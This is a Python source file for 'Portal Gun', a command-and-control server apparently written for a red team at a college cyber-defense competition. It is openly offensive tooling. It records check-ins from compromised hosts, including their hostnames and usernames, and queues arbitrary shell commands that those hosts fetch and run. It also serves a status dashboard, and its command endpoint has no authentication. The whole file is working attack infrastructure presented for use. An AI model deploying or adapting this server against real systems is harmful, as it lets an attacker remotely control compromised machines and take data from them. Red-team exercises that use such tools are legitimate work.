#!/usr/bin/env python3
"""
Portal Gun - Simple C2 Beacon Receiver
BYU CCDC Invitational 2026

"With the portal device, the impossible is easy."

This is a lightweight HTTP server that receives beacons from compromised
hosts. It's designed to track red team access across all competition teams.
"""

import argparse
import http.server
import json
import logging
import os
import socketserver
import sqlite3
import sys
import threading
from datetime import datetime
from pathlib import Path
from typing import Dict, List
from urllib.parse import parse_qs, urlparse


# Configuration


ROOT_DIR = Path(__file__).resolve().parents[1]
if str(ROOT_DIR) not in sys.path:
    sys.path.insert(0, str(ROOT_DIR))

from lib.common import get_log_dir

LOG_DIR = get_log_dir("aperture")
DB_PATH = LOG_DIR / "portal_gun.db"

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - PORTAL - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_DIR / f"portal_gun_{datetime.now():%Y%m%d_%H%M%S}.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("PortalGun")


# Database


def init_database():
    """Initialize SQLite database for beacon tracking"""
    conn = sqlite3.connect(str(DB_PATH))
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS beacons (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            source_ip TEXT NOT NULL,
            hostname TEXT,
            username TEXT,
            domain TEXT,
            beacon_type TEXT,
            team_number INTEGER,
            raw_data TEXT
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            created_at TEXT NOT NULL,
            target_hostname TEXT NOT NULL,
            command TEXT NOT NULL,
            executed INTEGER DEFAULT 0,
            result TEXT
        )
    ''')
    
    conn.commit()
    conn.close()
    logger.info("Database initialized")

def log_beacon(source_ip: str, data: Dict, beacon_type: str = "generic"):
    """Log a beacon to the database"""
    conn = sqlite3.connect(str(DB_PATH))
    cursor = conn.cursor()
    
    # Try to determine team number from source IP
    team_number = None
    if source_ip.startswith("192.168."):
        try:
            parts = source_ip.split('.')
            third_octet = int(parts[2])
            if 200 <= third_octet <= 212:
                team_number = third_octet - 200
        except:
            pass
    
    cursor.execute('''
        INSERT INTO beacons (timestamp, source_ip, hostname, username, domain, beacon_type, team_number, raw_data)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', (
        datetime.now().isoformat(),
        source_ip,
        data.get('hostname', data.get('h', 'unknown')),
        data.get('username', data.get('u', 'unknown')),
        data.get('domain', data.get('d', '')),
        beacon_type,
        team_number,
        json.dumps(data)
    ))
    
    conn.commit()
    conn.close()

def get_pending_command(hostname: str) -> str:
    """Get pending command for a host"""
    conn = sqlite3.connect(str(DB_PATH))
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT id, command FROM commands 
        WHERE target_hostname = ? AND executed = 0
        ORDER BY created_at ASC
        LIMIT 1
    ''', (hostname,))
    
    row = cursor.fetchone()
    if row:
        cursor.execute('UPDATE commands SET executed = 1 WHERE id = ?', (row[0],))
        conn.commit()
        conn.close()
        return row[1]
    
    conn.close()
    return ""

def get_beacon_stats() -> Dict:
    """Get beacon statistics"""
    conn = sqlite3.connect(str(DB_PATH))
    cursor = conn.cursor()
    
    # Total beacons
    cursor.execute('SELECT COUNT(*) FROM beacons')
    total = cursor.fetchone()[0]
    
    # By team
    cursor.execute('''
        SELECT team_number, COUNT(*) as count 
        FROM beacons 
        WHERE team_number IS NOT NULL 
        GROUP BY team_number
    ''')
    by_team = {row[0]: row[1] for row in cursor.fetchall()}
    
    # By hostname
    cursor.execute('''
        SELECT hostname, COUNT(*) as count 
        FROM beacons 
        GROUP BY hostname 
        ORDER BY count DESC 
        LIMIT 10
    ''')
    by_host = {row[0]: row[1] for row in cursor.fetchall()}
    
    # Recent beacons
    cursor.execute('''
        SELECT timestamp, source_ip, hostname, team_number, beacon_type 
        FROM beacons 
        ORDER BY timestamp DESC 
        LIMIT 20
    ''')
    recent = [
        {
            "timestamp": row[0],
            "source_ip": row[1],
            "hostname": row[2],
            "team": row[3],
            "type": row[4]
        }
        for row in cursor.fetchall()
    ]
    
    conn.close()
    
    return {
        "total_beacons": total,
        "by_team": by_team,
        "by_host": by_host,
        "recent": recent
    }


# HTTP Handler


class PortalGunHandler(http.server.BaseHTTPRequestHandler):
    """HTTP handler for beacon requests"""
    
    def log_message(self, format, *args):
        """Override to use our logger"""
        logger.debug("%s - - [%s] %s" % (
            self.address_string(),
            self.log_date_time_string(),
            format % args
        ))
    
    def send_cors_headers(self):
        """Send CORS headers for cross-origin requests"""
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
    
    def do_OPTIONS(self):
        """Handle OPTIONS requests for CORS"""
        self.send_response(200)
        self.send_cors_headers()
        self.end_headers()
    
    def do_GET(self):
        """Handle GET requests"""
        parsed = urlparse(self.path)
        path = parsed.path
        params = parse_qs(parsed.query)
        
        client_ip = self.client_address[0]
        
        if path == '/beacon' or path == '/wheatley' or path == '/smh' or path == '/cube':
            # Extract beacon data from query params
            data = {k: v[0] if len(v) == 1 else v for k, v in params.items()}
            beacon_type = path.strip('/')
            
            log_beacon(client_ip, data, beacon_type)
            logger.info(f"Beacon from {client_ip}: {data.get('h', 'unknown')} ({beacon_type})")
            
            # Check for pending commands
            hostname = data.get('h', data.get('hostname', ''))
            cmd = get_pending_command(hostname)
            
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.send_cors_headers()
            self.end_headers()
            self.wfile.write(cmd.encode() if cmd else b"OK")
            
        elif path == '/stats':
            # Return beacon statistics
            stats = get_beacon_stats()
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_cors_headers()
            self.end_headers()
            self.wfile.write(json.dumps(stats, indent=2).encode())
            
        elif path == '/dashboard':
            # Serve a simple dashboard
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(self.get_dashboard_html().encode())
            
        elif path == '/':
            # Root - redirect to dashboard
            self.send_response(302)
            self.send_header('Location', '/dashboard')
            self.end_headers()
            
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        """Handle POST requests"""
        parsed = urlparse(self.path)
        path = parsed.path
        client_ip = self.client_address[0]
        
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length).decode('utf-8')
        
        if path in ['/beacon', '/wheatley', '/smh', '/cube', '/cube_beacon']:
            # Parse JSON body or form data
            try:
                data = json.loads(body)
            except:
                data = dict(parse_qs(body))
                data = {k: v[0] if len(v) == 1 else v for k, v in data.items()}
            
            beacon_type = path.strip('/').replace('_beacon', '')
            log_beacon(client_ip, data, beacon_type)
            logger.info(f"Beacon (POST) from {client_ip}: {data.get('hostname', data.get('h', 'unknown'))} ({beacon_type})")
            
            # Check for pending commands
            hostname = data.get('hostname', data.get('h', ''))
            cmd = get_pending_command(hostname)
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_cors_headers()
            self.end_headers()
            response = {"status": "ok", "command": cmd} if cmd else {"status": "ok"}
            self.wfile.write(json.dumps(response).encode())
            
        elif path == '/command':
            # Queue a command for a host
            try:
                data = json.loads(body)
                hostname = data.get('hostname')
                command = data.get('command')
                
                if hostname and command:
                    conn = sqlite3.connect(str(DB_PATH))
                    cursor = conn.cursor()
                    cursor.execute('''
                        INSERT INTO commands (created_at, target_hostname, command)
                        VALUES (?, ?, ?)
                    ''', (datetime.now().isoformat(), hostname, command))
                    conn.commit()
                    conn.close()
                    
                    logger.info(f"Command queued for {hostname}: {command[:50]}...")
                    
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps({"status": "queued"}).encode())
                else:
                    self.send_response(400)
                    self.end_headers()
            except Exception as e:
                logger.error(f"Command queue error: {e}")
                self.send_response(500)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()
    
    def get_dashboard_html(self) -> str:
        """Generate dashboard HTML"""
        stats = get_beacon_stats()
        
        recent_rows = ""
        for b in stats['recent']:
            recent_rows += f"""
            <tr>
                <td>{b['timestamp']}</td>
                <td>{b['source_ip']}</td>
                <td>{b['hostname']}</td>
                <td>Team {b['team']}</td>
                <td>{b['type']}</td>
            </tr>
            """
        
        team_rows = ""
        for team, count in sorted(stats['by_team'].items()):
            team_rows += f"<tr><td>Team {team}</td><td>{count}</td></tr>"
        
        return f"""
<!DOCTYPE html>
<html>
<head>
    <title>Portal Gun - Aperture Science C2</title>
    <meta http-equiv="refresh" content="30">
    <style>
        body {{
            font-family: 'Consolas', monospace;
            background: #1a1a2e;
            color: #eee;
            padding: 20px;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
        }}
        h1 {{
            color: #ff9900;
            text-align: center;
        }}
        .banner {{
            text-align: center;
            color: #ff9900;
            white-space: pre;
            font-size: 10px;
            line-height: 1.2;
        }}
        .stats {{
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin: 20px 0;
        }}
        .card {{
            background: #16213e;
            border-radius: 10px;
            padding: 20px;
            border: 1px solid #ff9900;
        }}
        table {{
            width: 100%;
            border-collapse: collapse;
        }}
        th, td {{
            padding: 8px;
            text-align: left;
            border-bottom: 1px solid #333;
        }}
        th {{
            color: #ff9900;
        }}
        .total {{
            font-size: 48px;
            color: #ff9900;
            text-align: center;
        }}
    </style>
</head>
<body>
    <div class="container">
        <pre class="banner">
 ██████╗  ██████╗ ██████╗ ████████╗ █████╗ ██╗          ██████╗ ██╗   ██╗███╗   ██╗
 ██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝██╔══██╗██║         ██╔════╝ ██║   ██║████╗  ██║
 ██████╔╝██║   ██║██████╔╝   ██║   ███████║██║         ██║  ███╗██║   ██║██╔██╗ ██║
 ██╔═══╝ ██║   ██║██╔══██╗   ██║   ██╔══██║██║         ██║   ██║██║   ██║██║╚██╗██║
 ██║     ╚██████╔╝██║  ██║   ██║   ██║  ██║███████╗    ╚██████╔╝╚██████╔╝██║ ╚████║
 ╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝     ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝
                     Aperture Science C2 Dashboard
        </pre>
        
        <div class="stats">
            <div class="card">
                <h2>Total Beacons</h2>
                <div class="total">{stats['total_beacons']}</div>
            </div>
            <div class="card">
                <h2>By Team</h2>
                <table>
                    <tr><th>Team</th><th>Beacons</th></tr>
                    {team_rows}
                </table>
            </div>
        </div>
        
        <div class="card">
            <h2>Recent Beacons</h2>
            <table>
                <tr>
                    <th>Timestamp</th>
                    <th>Source IP</th>
                    <th>Hostname</th>
                    <th>Team</th>
                    <th>Type</th>
                </tr>
                {recent_rows}
            </table>
        </div>
        
        <p style="text-align: center; color: #666; margin-top: 20px;">
            "The cake is a lie." - Auto-refreshes every 30 seconds
        </p>
    </div>
</body>
</html>
"""


# Server


class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    """Threaded HTTP server"""
    allow_reuse_address = True

def run_server(port: int = 8080):
    """Start the C2 server"""
    init_database()
    
    server = ThreadedHTTPServer(('0.0.0.0', port), PortalGunHandler)
    
    logger.info(f"Portal Gun C2 starting on port {port}")
    logger.info(f"Dashboard: http://localhost:{port}/dashboard")
    logger.info(f"Stats API: http://localhost:{port}/stats")
    logger.info(f"Beacon endpoints: /beacon, /wheatley, /smh, /cube")
    
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║                                                               ║
    ║   ██████╗  ██████╗ ██████╗ ████████╗ █████╗ ██╗               ║
    ║   ██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝██╔══██╗██║               ║
    ║   ██████╔╝██║   ██║██████╔╝   ██║   ███████║██║               ║
    ║   ██╔═══╝ ██║   ██║██╔══██╗   ██║   ██╔══██║██║               ║
    ║   ██║     ╚██████╔╝██║  ██║   ██║   ██║  ██║███████╗          ║
    ║   ╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝          ║
    ║                      GUN                                      ║
    ║                                                               ║
    ║   Aperture Science C2 Beacon Receiver                         ║
    ║   "With the portal device, the impossible is easy."           ║
    ║                                                               ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        logger.info("Shutting down Portal Gun...")
        server.shutdown()


# CLI


def main():
    parser = argparse.ArgumentParser(
        description="Portal Gun - Aperture Science C2 Beacon Receiver"
    )
    
    parser.add_argument("-p", "--port", type=int, default=8080,
                        help="Port to listen on (default: 8080)")
    parser.add_argument("--stats", action="store_true",
                        help="Show beacon statistics and exit")
    parser.add_argument("--command", nargs=2, metavar=('HOSTNAME', 'CMD'),
                        help="Queue a command for a host")
    
    args = parser.parse_args()
    
    if args.stats:
        init_database()
        stats = get_beacon_stats()
        print(json.dumps(stats, indent=2))
        return
    
    if args.command:
        init_database()
        hostname, cmd = args.command
        conn = sqlite3.connect(str(DB_PATH))
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO commands (created_at, target_hostname, command)
            VALUES (?, ?, ?)
        ''', (datetime.now().isoformat(), hostname, cmd))
        conn.commit()
        conn.close()
        print(f"Command queued for {hostname}")
        return
    
    run_server(args.port)

if __name__ == "__main__":
    main()
